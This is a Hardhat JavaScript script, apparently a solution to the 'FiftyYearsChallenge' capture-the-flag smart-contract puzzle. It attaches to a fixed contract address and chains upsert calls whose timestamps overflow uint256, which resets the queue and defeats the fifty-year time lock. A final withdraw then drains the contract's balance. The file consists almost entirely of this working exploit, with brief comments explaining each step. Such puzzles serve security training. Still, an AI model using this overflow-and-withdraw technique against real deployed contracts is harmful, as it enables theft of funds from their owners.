const { ethers } = require('hardhat');
const { BigNumber } = ethers;

const CHALLENGE_ADDRESS = '0x68807BC3901f26F01FAA9b65603A65321A81a21A';

const ONE_DAY = 86400;
const MAX_UINT = BigNumber.from(2).pow(256);

async function main() {
  const FiftyYearsChallenge = await ethers.getContractFactory('FiftyYearsChallenge');
  const contract = await FiftyYearsChallenge.attach(CHALLENGE_ADDRESS);

  // Enlarge the queue and waste some weis
  await contract.upsert(4, MAX_UINT.sub(ONE_DAY * 3), { value: 3 });

  // Upsert item, which results in an amount being registered equal to msg.value + 1
  await contract.upsert(2, MAX_UINT.sub(ONE_DAY * 2), { value: 1 });

  // Last item with high timestamp
  await contract.upsert(3, MAX_UINT.sub(ONE_DAY * 1), { value: 2 });

  // This item makes the head go to zero, and sets an amount of weis
  // equal to the wasted ones on the first step
  await contract.upsert(3, 0, { value: 3 });

  // Redeem everything
  await contract.withdraw(3);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
